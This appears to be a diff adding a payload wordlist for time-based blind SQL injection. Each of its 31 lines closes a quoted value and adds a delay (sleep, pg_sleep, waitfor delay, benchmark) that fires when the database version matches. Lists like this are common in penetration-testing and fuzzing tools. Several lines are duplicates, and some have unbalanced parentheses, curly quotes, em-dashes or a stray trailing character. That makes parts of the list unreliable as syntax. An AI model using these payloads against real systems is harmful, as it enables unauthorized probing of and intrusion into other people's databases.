@@ -1,0 +1,31 @@
+1' or if(substring(@@version,1,1)='5',char(12),0)#
+1' or (select case when (version() like '5%') then (sleep(5)) end)#
+1' or (select case when (version() like '5%') then (pg_sleep(5)) end)#
+1' or (select case when (version() like '5%') then (sleep(5)) end)#
+1' or (select case when (version() like '5%') then (waitfor delay '0:0:5') end)#
+1' or (select case when (version() like '5%') then (delay_sec(5)) end)#
+1' or (select case when (version() like '5%') then (benchmark(50000,md5(1)))) end)#
+1' or (select case when (version() like '5%') then (sleep(5)))--
+1' or (select case when (version() like '5%') then (pg_sleep(5)))--
+1' or (select case when (version() like '5%') then (waitfor delay '0:0:5'))--
+1' or (select case when (version() like '5%') then (delay_sec(5)))--
+1' or (select case when (version() like '5%') then (benchmark(50000,md5(1)))))--
+1' or (select case when (version() like '5%') then (sleep(5)))--
+1' or (select case when (version() like '5%') then (pg_sleep(5)))--
+1' or (select case when (version() like '5%') then (waitfor delay '0:0:5'))--
+1' or (select case when (version() like '5%') then (delay_sec(5)))--
+1' or (select case when (version() like '5%') then (benchmark(50000,md5(1)))))--
+1' or pg_sleep(5) --
+“ or pg_sleep(5) --
+‘ or pg_sleep(5) --
+or pg_sleep(5) --
+;waitfor delay ‘0:0:5’ —-
+‘;WAITFOR DELAY ‘0:0:5’ —-
+);waitfor delay ‘0:0:5’ —-
+‘;waitfor delay ‘0:0:5’ —-
+“;waitfor delay ‘0:0:5’ —-
+‘);waitfor delay ‘0:0:5’ —-
+“);waitfor delay ‘0:0:5’ —-
+));waitfor delay ‘0:0:5’ —-
+‘));waitfor delay ‘0:0:5’ —-
+“));waitfor delay ‘0:0:5’ —-a
